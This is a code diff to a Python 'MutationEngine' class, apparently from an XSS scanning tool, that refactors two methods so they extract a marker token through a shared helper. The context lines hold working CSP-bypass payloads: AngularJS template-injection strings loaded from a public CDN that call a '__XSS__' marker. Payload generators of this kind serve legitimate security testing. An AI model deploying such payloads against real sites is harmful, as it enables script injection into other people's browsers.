@@ -1342,12 +1342,7 @@ class MutationEngine:
     @staticmethod
     def apply_csp_bypass_cdn(payload: str) -> List[str]:
         """Wrap payload to load libraries from allowed CDNs that support template execution or gadget bypasses."""
-        if '__XSS__' not in payload:
-            return [payload]
-            
-        import re
-        token_match = re.search(r'__XSS__\([\'"]([a-zA-Z0-9_-]+)[\'"]\)', payload)
-        token = token_match.group(1) if token_match else "TOKEN"
+        token = MutationEngine._extract_token_from_payload(payload)
         
         return [
             f'<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.10/angular.min.js"></script><div ng-app>{{{{constructor.constructor(\'__XSS__("{token}")\')()}}}}</div>',
@@ -1359,12 +1354,7 @@ class MutationEngine:
     @staticmethod
     def apply_csp_bypass_angular(payload: str) -> List[str]:
         """Convert standard JS expressions into AngularJS / client-side template injection payloads."""
-        if '__XSS__' not in payload:
-            return [payload]
-            
-        import re
-        token_match = re.search(r'__XSS__\([\'"]([a-zA-Z0-9_-]+)[\'"]\)', payload)
-        token = token_match.group(1) if token_match else "TOKEN"
+        token = MutationEngine._extract_token_from_payload(payload)
         
         return [
             f"{{{{constructor.constructor('__XSS__(\"{token}\")')()}}}}",
